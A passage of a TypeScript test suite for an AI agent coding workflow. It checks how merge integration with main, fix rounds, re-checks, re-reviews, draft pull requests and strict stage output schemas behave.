  assert.deepEqual(Object.keys(schema.properties), ["status", "summary", "merge", "conflicts"]);

  const config = { ...engineConfig, commitAuthor: { name: "Pat O'Brien", email: "pat@example.org" } };
  const authored = await simulate({ ...args, config }, happy());
  assert.ok(authored.task("integrate").includes("git -c 'user.name=Pat O'\\''Brien' -c 'user.email=pat@example.org' -C '/tmp/repo-worktrees/issue-2' merge --no-edit"));
});

test("a clean integration needs no fix", async () => {
  const { result, calls, task } = await simulate(args, happy());
  assert.deepEqual(keysOf(calls).slice(-2), ["integrate", "pr"]);
  assert.deepEqual(result.integration, { status: "pass", main: "c57139f", head: "abc1234", merge: "merged", conflicts: [], failing: [], checks: { test: "pass" }, firstAttempt: null, fix: null, reReview: null, note: "" });
  assert.deepEqual(result.checks, { test: "pass" });
  assert.ok(task("pr").includes(JSON.stringify(result.integration)));
  assert.match(task("pr"), /"Integration" line/);
  assert.match(task("pr"), /the branch commit the checks ran on \(head\)/);
  assert.match(task("pr"), /Does not integrate with main:/);
  assert.equal(result.draft, false);
});

test("every check runs to the end, after a failing one too", async () => {
  const config = { ...engineConfig, checks: [{ name: "lint", command: "just lint" }, { name: "test", command: "npm test" }] };
  const both = { lint: "pass", test: "pass" };
  const answers = happy({
    implement: { structuredOutput: { status: "done", summary: "s", changed_files: ["a.ts"], checks: both } },
    "integrate-fix": { structuredOutput: { status: "done", summary: "lint", changed_files: ["a.ts"], non_test_files: [], checks: both } },
  });
  const { result, hostCalls, task } = await simulate({ ...args, config }, answers, { host: hostWith({ "check-lint": { exit: 2, stdout: "lint broke" } }) });
  assert.deepEqual(hostCalls.filter((h) => h.key.startsWith("check-")).map((h) => h.command), ["just lint", "npm test"]);
  assert.deepEqual(result.integration.firstAttempt.checks, { lint: "fail", test: "pass" });
  assert.match(task("integrate-fix"), /these checks fail after it: lint\./);
});

test("a conflict gets one fix round, a re-check and a code re-review, and runs no check before the fix", async () => {
  const { result, calls, events, task } = await simulate(args, happy({ integrate: conflict }));
  assert.deepEqual(keysOf(calls), ["spec", "implement", "review-code-r0", "review-ux-r0", "integrate", "integrate-fix", "integrate-recheck", "review-code-r1", "pr"]);
  assert.deepEqual(events.slice(events.indexOf("host-fetch")), ["host-fetch", "integrate", "host-heads", "integrate-fix", "host-recheck-fetch", "integrate-recheck", "host-recheck-heads", "recheck-test", "host-diff-r1", "review-code-r1", "pr"]);
  assert.equal(calls.find((c) => c.key === "integrate-fix")!.model, "claude-bridge/claude-sonnet-5-5");
  const fix = task("integrate-fix");
  assert.match(fix, /conflicts in: src\/tools\.ts/);
  assert.match(fix, /origin\/main \(c57139f\)/);
  assert.ok(fix.includes(mergeLine.trim()));
  assert.match(fix, /--no-edit --cleanup=strip/);
  assert.match(fix, /Tests never use the network\./);
  assert.match(fix, /never revert or weaken main's changes/);
  assert.match(fix, /- test: npm test/);
  assert.match(fix, /docs\/specs\/2-scaffold\.md/);
  assert.match(task("review-code-r1"), /INTEGRATION FIX/);
  assert.match(task("review-code-r1"), /conflicted in src\/tools\.ts/);
  assert.ok(task("review-code-r1").includes(diffAt(1)));
  assert.deepEqual(result.rounds.at(-1), { round: 1, lenses: ["code"], diff: "r1.diff (+120 -0 lines, 2 files)", blocking: 0, after: "integration fix" });
  assert.equal(result.integration.reReview, 1);
  assert.equal(result.integration.status, "pass");
  assert.deepEqual(result.integration.conflicts, [], "the record is the re-check's");
  assert.deepEqual(result.integration.firstAttempt.conflicts, ["src/tools.ts"]);
  assert.equal(result.draft, false);
});

test("failing checks after the merge: the fix gets their exit codes and cut output, and runs them itself", async () => {
  const { result, task } = await simulate(args, happy(), { host: failingTest("x".repeat(500)) });
  const fix = task("integrate-fix");
  assert.match(fix, /these checks fail after it: test\./);
  assert.ok(fix.includes('"exit": 1'));
  assert.ok(fix.includes('"detail": "Command exited with code 1. xxx'));
  assert.ok(!fix.includes("x".repeat(200)), "pi-subagents gives at most 200 characters");
  assert.match(fix, /cut to 200 characters/);
  assert.match(fix, /That is not the full output: run each failing check yourself to see it\./);
  assert.deepEqual(result.integration.failing, [], "the re-check passed");
  assert.deepEqual(result.integration.firstAttempt.failing, ["test"]);
});

test("a check that times out or is killed fails; one that cannot run is an integration error", async () => {
  const timeout = await simulate(args, happy(), { host: hostWith({ "check-test": { timeout: true } }) });
  assert.ok(timeout.task("integrate-fix").includes('"exit": "timeout"'));
  assert.ok(timeout.task("integrate-fix").includes(`Command timed out after ${CHECK_TIMEOUT_MS}ms.`));
  assert.deepEqual(timeout.result.integration.firstAttempt.checks, { test: "fail" });
  const killed = await simulate(args, happy(), { host: hostWith({ "check-test": { exit: "unknown" } }) });
  assert.ok(killed.task("integrate-fix").includes('"exit": "unknown"'), "killed by a signal: a failing check");

  const denied = await simulate(args, happy(), { host: hostWith({ "check-test": { error: "The command for runs.host('check-test') is not allowed for workflow resource 'pi-crucible'." } }) });
  assert.ok(!keysOf(denied.calls).includes("integrate-fix"), "not a failing check, so no fix round");
  assert.equal(denied.result.integration.status, "error");
  assert.match(denied.result.integration.note, /^check test could not run: The command for runs\.host/);
  assert.equal(denied.result.draft, true);
});

test("a fetch or rev-parse that fails is an integration error; a failed fetch skips the merge", async () => {
  const fetch = await simulate(args, happy(), { host: hostWith({ "host-fetch": { exit: 128, stdout: "fatal: unable to access" } }) });
  assert.ok(!keysOf(fetch.calls).includes("integrate"));
  assert.equal(fetch.result.integration.note, "git fetch origin && git rev-parse --short origin/main: Command exited with code 128. fatal: unable to access");
  const heads = await simulate(args, happy(), { host: hostWith({ "host-heads": { stdout: "" } }) });
  assert.equal(heads.result.integration.status, "error");
  assert.equal(heads.result.integration.note, "git rev-parse origin/main HEAD: unexpected output");
  assert.ok(!heads.hostCalls.some((h) => h.key === "check-test"));
});

test("a fix that touched only tests is not re-reviewed", async () => {
  const testOnly = { structuredOutput: { status: "done", summary: "fixture", changed_files: ["test/a.test.ts"], non_test_files: [], checks: { test: "pass" } } };
  const { result, calls } = await simulate(args, happy({ "integrate-fix": testOnly }), { host: failingTest() });
  assert.deepEqual(keysOf(calls).slice(-4), ["integrate", "integrate-fix", "integrate-recheck", "pr"]);
  assert.equal(result.integration.reReview, null);
  const noField = { structuredOutput: { status: "done", summary: "fixture", changed_files: ["a.ts"], checks: { test: "pass" } } };
  const fallback = await simulate(args, happy({ "integrate-fix": noField }), { host: failingTest() });
  assert.ok(keysOf(fallback.calls).includes("review-code-r1"));
  assert.equal(fallback.result.integration.reReview, 1);
});

test("the integration re-review follows the last revise round", async () => {
  const { calls, task } = await simulate(args, blockerOnCode, { host: failingTest() });
  const keys = keysOf(calls);
  assert.deepEqual(keys.slice(keys.indexOf("review-code-r1")), ["review-code-r1", "integrate", "integrate-fix", "integrate-recheck", "review-code-r2", "pr"]);
  assert.match(task("review-code-r2"), /"code-r2-<n>"/);
});

test("integration re-review findings add to earlier findings and make a draft", async () => {
  const finding = (id: string, severity: string) => ({ id, severity, location: "a.ts:1", problem: "p", fix: "f" });
  const run = (withMinor: boolean) => simulate({ ...args, maxRounds: 1 }, (key) => {
    if (key === "review-code-r0") return { structuredOutput: { verdict: "changes", findings: [finding("code-r0-1", "blocker")] } };
    if (key === "review-ux-r0") return { structuredOutput: { verdict: "changes", findings: [finding("ux-r0-1", "major")] } };
    if (key === "revise-r1") return { structuredOutput: { status: "done", summary: "s", responses: [], changed_files: ["a.ts"], checks: { test: "pass" } } };
    if (key === "review-code-r1") return { structuredOutput: { verdict: "changes", findings: [finding("code-r1-1", "blocker")] } };
    if (key === "review-ux-r1") return { structuredOutput: { verdict: "changes", findings: [finding("ux-r1-1", "major")] } };
    if (key === "review-code-r2") return { structuredOutput: { verdict: "changes", findings: [finding("code-r2-1", "major"), ...(withMinor ? [finding("code-r2-2", "minor")] : [])] } };
    return happy()(key);
  }, { host: failingTest() });
  const { result, calls } = await run(true);
  assert.ok(keysOf(calls).includes("review-code-r2"));
  assert.deepEqual(result.unresolved.map((f: { id: string }) => f.id), ["code-r1-1", "ux-r1-1", "code-r2-1"]);
  assert.equal(result.draft, true);
  const without = await run(false);
  assert.equal(result.followUps, without.result.followUps + 1);
});

test("an approving integration re-review does not clear earlier code findings", async () => {
  const finding = (id: string) => ({ id, severity: "blocker", location: "a.ts:1", problem: "p", fix: "f" });
  const { result } = await simulate({ ...args, maxRounds: 1 }, (key) => {
    if (key === "review-code-r0") return { structuredOutput: { verdict: "changes", findings: [finding("code-r0-1")] } };
    if (key === "revise-r1") return { structuredOutput: { status: "done", summary: "s", responses: [], changed_files: ["a.ts"], checks: { test: "pass" } } };
    if (key === "review-code-r1") return { structuredOutput: { verdict: "changes", findings: [finding("code-r1-1")] } };
    return happy()(key);
  }, { host: failingTest() });
  assert.equal(result.integration.reReview, 2);
  assert.deepEqual(result.unresolved.map((f: { id: string }) => f.id), ["code-r1-1"]);
  assert.equal(result.draft, true);
});

test("integration that cannot run, or a fix that fails, opens a draft without flagging", async () => {
  const noRun = await simulate(args, happy({ integrate: { ok: false, error: "boom" } }));
  assert.deepEqual(keysOf(noRun.calls).slice(-2), ["integrate", "pr"]);
  assert.equal(noRun.result.integration.status, "error");
  assert.equal(noRun.result.integration.note, "boom");
  assert.ok(!noRun.hostCalls.some((h) => h.key === "check-test"));
  assert.equal(noRun.result.draft, true);
  assert.ok(!keysOf(noRun.calls).some((k) => k.startsWith("flag-")));
  assert.match(noRun.task("pr"), /Does not integrate with main:/);

  const blocked = { structuredOutput: { status: "blocked", summary: "cannot" } };
  const failedFix = await simulate(args, happy({ "integrate-fix": blocked }), { host: failingTest() });
  assert.deepEqual(keysOf(failedFix.calls).slice(-3), ["integrate", "integrate-fix", "pr"]);
  assert.equal(failedFix.result.integration.status, "fail");
  assert.equal(failedFix.result.integration.fix.status, "blocked");
  assert.equal(failedFix.result.integration.fix.summary, "cannot");
  assert.equal(failedFix.result.draft, true);

  const stillFailing = await simulate(args, happy(), { host: hostWith({ "check-test": { exit: 1 }, "recheck-test": { exit: 1 } }) });
  assert.equal(stillFailing.result.integration.status, "fail");
  assert.equal(stillFailing.result.draft, true);

  const recheckGone = await simulate(args, happy({ "integrate-recheck": { ok: false, error: "gone" } }), { host: failingTest() });
  assert.equal(recheckGone.result.integration.status, "error");
  assert.equal(recheckGone.result.integration.note, "re-check: gone");
});

test("only the integration stages may merge", async () => {
  const { calls } = await simulate(args, happy({ integrate: conflict }));
  const merging = calls.filter((c) => c.task.includes("merge --no-edit")).map((c) => c.key);
  assert.deepEqual(merging, ["integrate", "integrate-fix", "integrate-recheck"]);
  for (const c of calls) assert.match(c.task, /never merge/, c.key);
});

test("a PR stage stop still reports the integration", async () => {
  const { result } = await simulate(args, happy({ pr: { ok: false, error: "boom" } }));
  assert.equal(result.stopped, true);
  assert.equal(result.integration.status, "pass");
});

test("with no checks configured, stages say so, no check runs and integration still passes", async () => {
  const config = { ...engineConfig, checks: [] };
  const { result, task, hostCalls } = await simulate({ ...args, config }, (key) => {
    if (key === "implement") return { structuredOutput: { status: "done", summary: "s", changed_files: ["a.ts"], checks: {} } };
    if (key === "integrate") return merged({ merge: "up-to-date" });
    return happy()(key);
  });
  assert.match(task("implement"), /\(none configured: say so in summary/);
  assert.deepEqual(hostCalls.map((h) => h.key), ["host-worktree", "host-review-ignore", "host-diff-r0", "host-fetch", "host-heads"]);
  assert.equal(result.draft, false);
  assert.equal(result.integration.status, "pass");
});

// ---- Strict stage outputs (#56) --------------------------------------------------------
// The stray report from factory-control run 91a2b4ec: a second structured_output call, last one wins.
const stray = { status: "done", pr_url: "" };

test("every stage schema is closed, so the stray second report is rejected", async () => {
  const { calls } = await simulate(args, happy({ integrate: conflict }));
  const closed = (schema: Record<string, unknown>, where: string): void => {
    if (schema.type === "object") assert.equal(schema.additionalProperties, false, where);
    for (const [k, v] of Object.entries((schema.properties ?? {}) as Record<string, Record<string, unknown>>)) closed(v, `${where}.${k}`);
    if (schema.items) closed(schema.items as Record<string, unknown>, `${where}[]`);
  };
  const withSchema = calls.filter((c) => c.outputSchema);
  assert.deepEqual(withSchema.map((c) => c.key), ["spec", "implement", "review-code-r0", "review-ux-r0", "integrate", "integrate-fix", "integrate-recheck", "review-code-r1", "pr"]);
  for (const c of withSchema) {
    closed(c.outputSchema as Record<string, unknown>, c.key);
    assert.equal(await validates(c.outputSchema, stray), false, c.key);
    assert.match(c.task, /Call structured_output once, as your last step, with the whole report\. A later call replaces an\nearlier one\. If a call is rejected, fix the report and call it again\./, c.key);
  }
  const integrate = calls.find((c) => c.key === "integrate")!.outputSchema;
  assert.equal(await validates(integrate, happy()("integrate").structuredOutput), true);
  assert.equal(await validates(integrate, { status: "blocked", summary: "merge failed" }), true, "a blocked report invents nothing");
  assert.equal(await validates(integrate, { status: "done", summary: "", merge: "merged", checks: { test: "pass" } }), false, "the agent reports no checks");
});

test("a done merge report without its fields is a stage error, and no check runs", async () => {
  const { result, calls, hostCalls, task } = await simulate(args, happy({ integrate: { structuredOutput: stray, invalid: true } }));
  assert.deepEqual(keysOf(calls).slice(-2), ["integrate", "pr"]);
  assert.equal(result.integration.status, "error");
  assert.equal(result.integration.note, 'integrate reported "done" without: merge');
  assert.ok(!hostCalls.some((h) => h.key === "check-test"));
  assert.equal(result.draft, true);
  assert.match(task("pr"), /Does not integrate with main:/);
  const noConflicts = await simulate(args, happy({ integrate: { structuredOutput: { status: "done", summary: "", merge: "conflict" } } }));
  assert.equal(noConflicts.result.integration.note, 'integrate reported "done" without: conflicts');
  assert.ok(!keysOf(noConflicts.calls).includes("integrate-fix"));

  const recheck = await simulate(args, happy({ "integrate-recheck": { structuredOutput: stray, invalid: true } }), { host: failingTest() });
  assert.deepEqual(recheck.result.integration, {
    status: "error",
    main: null,
    head: null,
    merge: null,
    conflicts: [],
    failing: [],
    checks: { test: "pass" },
    firstAttempt: { main: "c57139f", head: "abc1234", merge: "merged", conflicts: [], failing: ["test"], checks: { test: "fail" } },
    fix: { status: "done", summary: "renamed call", changed_files: ["a.ts"], non_test_files: ["a.ts"] },
    reReview: 1,
    note: 're-check: integrate reported "done" without: merge',
  });
  assert.ok(!recheck.hostCalls.some((h) => h.key === "recheck-test"));
});

test("a recheck that changes the result updates the record", async () => {
  const { result, task } = await simulate(args, happy({ "integrate-recheck": merged({ merge: "up-to-date" }) }), { host: hostWith({ "check-test": { exit: 1, stdout: "boom" }, "host-recheck-heads": { stdout: "d00d00d000000000000000000000000000000000\nfeedbee000000000000000000000000000000000\n" } }) });
  assert.equal(result.integration.status, "pass");
  assert.equal(result.integration.main, "d00d00d");
  assert.equal(result.integration.head, "feedbee");
  assert.equal(result.integration.merge, "up-to-date");
  assert.deepEqual(result.integration.failing, []);
  assert.deepEqual(result.integration.checks, { test: "pass" });
  assert.deepEqual(result.integration.firstAttempt, { main: "c57139f", head: "abc1234", merge: "merged", conflicts: [], failing: ["test"], checks: { test: "fail" } });
  assert.ok(task("pr").includes(JSON.stringify(result.integration)));
  assert.match(task("pr"), /when firstAttempt is not null/);
  assert.match(task("pr"), /every string a stage reported \(diffs, errors, notes, summaries, revise responses\) in\n\s+inline code/);
  assert.match(task("review-code-r1"), /origin\/main \(c57139f\) was merged\ninto the branch and these checks failed: test/);

  const same = await simulate(args, happy(), { host: hostWith({ "check-test": { exit: 1 }, "recheck-test": { exit: 1 } }) });
  assert.equal(same.result.integration.status, "fail");
  assert.deepEqual(same.result.integration.failing, ["test"]);
  assert.equal(same.result.integration.firstAttempt, null, "kept only when it differs");
});

test("other stages' done reports without the fields the script reads take their error paths", async () => {
  const impl = await simulate(args, happy({ implement: { structuredOutput: { status: "done", summary: "s", changed_files: ["a.ts"] } } }));
  assert.deepEqual(keysOf(impl.calls), ["spec", "implement", "flag-implement"]);
  assert.match(impl.task("flag-implement"), /Stage: implement\. implement reported "done" without: checks/);

  const revise = await simulate(args, (key) => (key === "revise-r1" ? { structuredOutput: { status: "done", summary: "", responses: [] } } : blockerOnCode(key)));
  assert.deepEqual(revise.result.rounds[1], { round: 1, stopped: true, error: 'revise reported "done" without: changed_files, checks' });

  const fix = await simulate(args, happy({ "integrate-fix": { structuredOutput: { status: "done", summary: "", checks: { test: "pass" } } } }), { host: failingTest() });
  assert.ok(!keysOf(fix.calls).includes("integrate-recheck"));
  assert.equal(fix.result.integration.fix.summary, 'integrate-fix reported "done" without: changed_files');
});
